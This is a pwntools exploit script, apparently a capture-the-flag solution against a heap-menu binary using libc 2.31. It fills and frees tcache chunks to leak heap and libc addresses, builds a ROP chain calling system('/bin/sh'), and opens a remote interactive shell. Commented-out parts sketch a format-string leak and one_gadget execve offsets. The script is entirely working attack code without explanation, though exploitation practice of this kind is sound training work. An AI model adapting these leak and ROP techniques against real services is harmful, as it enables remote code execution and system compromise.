from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./main")
io=remote("",)
elf=ELF("./main")
libc=ELF("./libc-2.31.so")

def add(s,cc):
    io.sendlineafter(b">> ",b"1")
    io.sendlineafter(b"size: \n",str(s))
    io.sendafter(b"content: \n",cc)
    
def delete(n):
    io.sendlineafter(b">> ",b"2")
    io.sendlineafter(b"index: \n",str(n))
    
def edit(n,cc):
    io.sendlineafter(b">> ",b"3")
    io.sendlineafter(b"index: \n",str(n))
    io.sendafter(b"content: \n",cc)

def show():
    io.sendlineafter(b">> ",b"4")
    

def admin():
    io.sendlineafter(b">> ",b"5")
    io.sendafter(b"Passwd: \n",b"1234567890")

# gdb.attach(io)
# pause()

for i in range(8):
    add(0x240,b"aaaa")
    
add(0x80,b"bbb") #8

for i in range(8):
    delete(i)

show()

io.recvuntil(b"1. ")
heap_addr=u64(io.recv(6).ljust(8,b"\x00"))-0x2a0
print("heap_addr: ",hex(heap_addr))

leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x1ebbe0
print("leak_addr: ",hex(leak_addr))

main_addr=leak_addr+0x26fc0
pop_rdi=leak_addr+0x26b72
ret=leak_addr+0x25679
sys_addr=leak_addr+libc.sym[b"system"]
str_sh=leak_addr+next(libc.search(b"/bin/sh"))
free_hook=leak_addr+libc.sym[b"__free_hook"]

# gdb.attach(io)
# pause()

add(0x240,b"\x00"*0x218+p64(ret)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr))

# admin()
# io.sendafter(b"name: \n",b"%6$p.%p")
# base_addr=int(io.recvuntil(b".",drop=True),16)-0x1970
# print("base_addr: ",hex(base_addr))

# stack_addr=int(io.recv(14),16)
# print("stack_addr: ",hex(stack_addr))

# ret_addr=stack_addr-0x1c
# print("ret_addr: ",hex(ret_addr))

# shell=leak_addr+0xe6c84

# main_addr=base_addr+0x18b7

# exit=leak_addr+0x49bdb

# final_addr=stack_addr-0x7c

# gdb.attach(io)
# pause()

# io.sendafter(b">> \n",b"2")
# io.recvuntil(b"WRITE MODE: \n")
# io.send(p64(ret_addr))
# io.send(p64(shell))

# io.recvuntil(b"MODE: \n")
# io.send(p64(ret_addr+0x10))
# io.send(p64(pop_rdi))

io.interactive()



# 0xe6c7e execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe6c81 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe6c84 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
